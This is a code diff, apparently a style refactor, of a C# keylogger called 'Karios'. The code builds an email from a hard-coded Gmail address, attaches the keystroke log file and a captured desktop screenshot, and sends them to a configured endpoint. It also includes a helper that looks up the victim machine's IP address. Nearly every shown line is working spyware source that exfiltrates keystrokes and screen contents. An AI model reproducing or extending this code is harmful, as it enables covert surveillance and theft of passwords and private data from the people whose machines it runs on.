@@ -262,16 +262,18 @@ namespace Karios
                 mail.From = new MailAddress("GINGIRULES@gmail.com");
                 mail.To.Add(_emailEndpoint);
                 mail.Subject = "log from keylogger on" + Environment.GetFolderPath(Environment.SpecialFolder.UserProfile);
-                mail.Body = "New log file from Computer (" + GetIPAddress(Dns.GetHostName()) + " , finshed at: " + DateTime.Now.ToString("yyyy-MM-dd");
+                mail.Body = "New log file from Computer (" + GetIpAddress(Dns.GetHostName()) + " , finshed at: " + DateTime.Now.ToString("yyyy-MM-dd");
                 var attachment = new Attachment(pathToLog);
                 mail.Attachments.Add(attachment);
                 CaptureDesktop();
                 // Convert it!
-                MemoryStream memStream = new MemoryStream(); //new one
-                memoryImage.Save(memStream, ImageFormat.Jpeg); 
-                ContentType contentType = new ContentType();
-                contentType.MediaType = MediaTypeNames.Image.Jpeg;
-                contentType.Name = "screen";
+                var memStream = new MemoryStream(); //new one
+                memoryImage.Save(memStream, ImageFormat.Jpeg);
+                var contentType = new ContentType
+                {
+                    MediaType = MediaTypeNames.Image.Jpeg,
+                    Name = "screen"
+                };
                 mail.Attachments.Add(new Attachment(memStream, contentType));
 
                 // Set ports and stuff
@@ -334,16 +336,12 @@ namespace Karios
             */
         }
 
-        public static IPAddress GetIPAddress(string hostName)
+        public static IPAddress GetIpAddress(string hostName)
         {
-            Ping ping = new Ping();
+            var ping = new Ping();
             var replay = ping.Send(hostName);
 
-            if (replay.Status == IPStatus.Success)
-            {
-                return replay.Address;
-            }
-            return null;
+            return replay != null && replay.Status == IPStatus.Success ? replay.Address : null;
         }
 
         public static void LaunchWebsite()
@@ -379,10 +377,10 @@ namespace Karios
         {
             // Start the process... 
             var memoryImage = new Bitmap(1000, 900);
-            Size s = new Size(memoryImage.Width, memoryImage.Height);
+            var s = new Size(memoryImage.Width, memoryImage.Height);
 
             // Create graphics 
-            Graphics memoryGraphics = Graphics.FromImage(memoryImage);
+            var memoryGraphics = Graphics.FromImage(memoryImage);
 
             // Copy data from screen 
             memoryGraphics.CopyFromScreen(0, 0, 0, 0, s);
